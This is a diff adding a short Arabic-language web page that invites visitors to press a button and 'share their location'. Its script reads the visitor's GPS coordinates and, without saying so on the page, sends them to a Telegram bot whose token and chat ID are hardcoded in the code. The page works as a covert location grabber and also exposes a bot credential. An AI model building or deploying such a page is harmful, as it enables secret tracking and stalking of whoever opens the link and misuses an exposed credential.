@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>مشاركة الموقع</title>
+</head>
+<body>
+  <h2>اضغط على الزر لمشاركة موقعك</h2>
+  <button onclick="getLocation()">مشاركة الموقع</button>
+  <p id="status"></p>
+
+  <script>
+    // ضع هنا توكن البوت ورقم المحادثة
+    const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
+    const CHAT_ID = "6024837142";
+
+    function getLocation() {
+      const status = document.getElementById('status');
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            status.innerHTML = `خط العرض: ${lat} <br>خط الطول: ${lon}`;
+
+            const message = `📍 تم الحصول على الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+              .then(response => console.log('تم الإرسال للبوت'))
+              .catch(error => console.error('خطأ في الإرسال:', error));
+          },
+          (error) => {
+            status.innerHTML = 'رفضت مشاركة الموقع أو حدث خطأ.';
+          }
+        );
+      } else {
+        status.innerHTML = 'المتصفح لا يدعم خدمة تحديد الموقع.';
+      }
+    }
+  </script>
+</body>
+</html>
